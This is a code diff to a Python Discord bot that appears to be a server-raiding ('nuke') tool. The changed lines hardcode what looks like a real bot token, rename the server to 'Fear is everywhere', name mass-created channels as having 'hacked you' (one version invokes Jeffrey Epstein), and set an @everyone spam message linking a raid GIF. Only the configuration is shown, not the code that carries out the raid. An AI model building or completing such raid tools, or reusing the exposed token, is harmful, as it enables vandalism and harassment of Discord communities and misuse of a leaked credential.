@@ -5,10 +5,10 @@ from discord.ext import commands
 import asyncio
 
 # Replace 'your_token_here' with your bot's token 
-TOKEN = 'your_token_here'
+TOKEN = 'MTQzMjEyNzIwNTUyNTQyNjI0OA.GR0Q14.l4NdlisugCyInfTvHKgS7mCX7RAg99tWlUClbQ'
 GUILD_NAME = 'Fear is everywhere'  # This is the name the server will be renamed to
-CHANNEL_NAME = 'fear has hacked you'  # This is the name for the channels to create
-SPAM_MESSAGE = "@everyone **Wake up, Fear.io is here** :joy: https://tenor.com/view/sinister-nuked-nuke-discord-raid-gif-24293736" # This is the message that will be spammed
+CHANNEL_NAME = ' jeffery epstien has hacked you'  # This is the name for the channels to create
+SPAM_MESSAGE = "@everyone **Wake up, jeffery epstien is here** :joy: https://tenor.com/view/sinister-nuked-nuke-discord-raid-gif-24293736" # This is the message that will be spammed
 
 intents = discord.Intents.default()
 intents.guilds = True
